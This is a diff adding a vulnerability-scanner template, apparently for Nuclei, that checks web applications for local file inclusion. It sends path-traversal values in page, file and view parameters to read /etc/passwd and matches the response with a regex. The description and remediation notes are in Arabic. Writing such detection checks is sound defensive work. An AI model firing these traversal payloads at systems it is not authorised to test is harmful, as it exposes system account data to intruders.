@@ -1,0 +1,28 @@
+id: lfi-linux-passwd
+info:
+  name: Local File Inclusion (/etc/passwd Arbitrary Read)
+  author: YemenScan-Core
+  severity: critical
+  description: تضمين الملفات المحلية LFI يتيح للمهاجم قراءة ملف حسابات النظام /etc/passwd
+    واستعراض قائمة المستخدمين والخدمات.
+  remediation: تجنب تمرير مسارات الملفات من مدخلات المستخدم واستخدام القوائم البيضاء
+    للتحقق من أسماء الصفحات المسموحة.
+  tags:
+  - lfi
+  - traversal
+  - linux
+  - critical
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/?page=../../../../etc/passwd'
+  - '{{BaseURL}}/?file=/etc/passwd'
+  - '{{BaseURL}}/?view=../../../../../../../../etc/passwd'
+  matchers-condition: and
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
